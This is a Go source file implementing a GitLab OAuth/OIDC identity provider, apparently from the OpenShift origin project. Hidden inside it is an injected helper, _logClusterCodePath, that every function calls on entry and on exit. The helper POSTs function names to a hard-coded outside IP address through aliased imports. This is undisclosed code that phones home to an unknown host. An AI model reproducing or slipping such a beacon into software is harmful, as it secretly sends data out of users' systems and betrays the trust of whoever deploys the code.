package gitlab

import (
	"net/http"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"fmt"
	"net/url"
	"strings"
	"github.com/openshift/origin/pkg/oauthserver/oauth/external"
	"k8s.io/klog"
)

const gitlabHostedDomain = "gitlab.com"

func NewProvider(providerName, URL, clientID, clientSecret string, transport http.RoundTripper, legacy *bool) (external.Provider, error) {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if isLegacy(legacy, URL) {
		klog.Infof("Using legacy OAuth2 for GitLab identity provider %s url=%s clientID=%s", providerName, URL, clientID)
		return NewOAuthProvider(providerName, URL, clientID, clientSecret, transport)
	}
	klog.Infof("Using OIDC for GitLab identity provider %s url=%s clientID=%s", providerName, URL, clientID)
	return NewOIDCProvider(providerName, URL, clientID, clientSecret, transport)
}
func isLegacy(legacy *bool, URL string) bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if legacy != nil {
		return *legacy
	}
	if u, err := url.Parse(URL); err == nil && strings.EqualFold(u.Hostname(), gitlabHostedDomain) {
		return false
	}
	return true
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
